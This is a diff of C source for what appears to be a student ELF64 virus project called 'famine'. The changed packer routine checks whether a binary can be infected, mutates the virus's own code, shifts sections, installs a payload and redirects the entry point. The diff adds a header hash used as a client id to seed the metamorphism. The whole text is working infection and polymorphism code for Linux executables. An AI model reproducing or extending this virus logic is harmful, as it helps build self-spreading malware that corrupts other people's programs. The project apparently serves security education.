@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/13 09:04:26 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/21 00:37:31 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -18,7 +18,7 @@ static bool	change_entry(const struct safe_pointer info, const struct entry *ori
 {
 	Elf64_Ehdr	*clone_hdr = safe(0, sizeof(Elf64_Ehdr));
 
-	if (!clone_hdr)  return errors(ERR_CORRUPT, 'a','1');
+	if (!clone_hdr)  return errors(ERR_FILE, _ERR_CANT_READ_ELFHDR);
 
 	const Elf64_Xword	sh_offset         = (original_entry->safe_shdr->sh_offset);
 	const size_t		offset_in_section = original_entry->offset_in_section;
@@ -75,8 +75,17 @@ static bool	define_shift_amount(const struct entry *original_entry, size_t *shif
 	const size_t	end_padding = (p_memsz % p_align) + *shift_amount;
 
 	if (end_padding > p_align)
-		return errors(ERR_USAGE, 'a','3');
+		return errors(ERR_VIRUS, _ERR_NOT_ENOUGH_PADDING);
 
+	return true;
+}
+
+bool		get_client_id(uint64_t *client_id, const struct safe_pointer info)
+{
+	Elf64_Ehdr	*elf_hdr = safe(0, sizeof(Elf64_Ehdr));
+	if (elf_hdr == NULL)
+		return errors(ERR_FILE, _ERR_CANT_READ_ELFHDR);
+	*client_id = hash((void *)elf_hdr, sizeof(Elf64_Ehdr));
 	return true;
 }
 
@@ -86,18 +95,20 @@ bool		elf64_packer(const struct famine food, size_t original_file_size, uint64_t
 	struct entry	clone_entry;
 	size_t		shift_amount;
 	uint64_t	son_seed[2];
+	uint64_t	client_id;
 
 	if (!find_entry(&original_entry, food.original_safe)
 	|| !can_infect(&original_entry, food.original_safe)
 	|| !define_shift_amount(&original_entry, &shift_amount)
-	|| !metamorph_self(seed, son_seed)
+	|| !get_client_id(&client_id, food.original_safe)
+	|| !metamorph_self(seed, son_seed, client_id)
 	|| !copy_to_clone(food, original_entry.end_of_last_section, shift_amount, original_file_size)
 	|| !adjust_references(food.clone_safe , shift_amount, &original_entry)
 	|| !find_entry(&clone_entry, food.clone_safe)
 	|| !adjust_sizes(shift_amount, &clone_entry)
 	|| !setup_payload(&clone_entry, food.clone_safe, son_seed)
 	|| !change_entry(food.clone_safe, &original_entry))
-		return errors(ERR_THROW, 'a','4');
+		return errors(ERR_THROW, _ERR_ELF64_PACKER);
 
 	return true;
 }
